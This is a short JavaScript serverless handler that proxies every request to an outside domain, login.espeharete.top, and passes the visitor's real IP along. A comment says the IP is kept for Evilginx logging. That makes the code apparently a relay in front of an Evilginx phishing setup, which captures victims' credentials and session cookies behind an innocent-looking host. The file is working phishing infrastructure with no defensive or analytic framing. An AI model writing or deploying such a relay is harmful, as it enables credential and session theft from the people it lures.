export default async function handler(req, res) {
  const targetUrl = `https://login.espeharete.top${req.url}`;

  // Clone headers and forward the real visitor IP
  const headers = { 
    ...req.headers,
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip, // Forward real IP
    'X-Real-IP': req.headers['x-real-ip'] || req.ip, // For Evilginx logging
  };
  delete headers['host']; // Avoid conflicts

  try {
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined,
    });

    const data = await response.text();
    res.status(response.status).send(data);
  } catch (error) {
    res.status(500).send("Proxy error: " + error.message);
  }
}
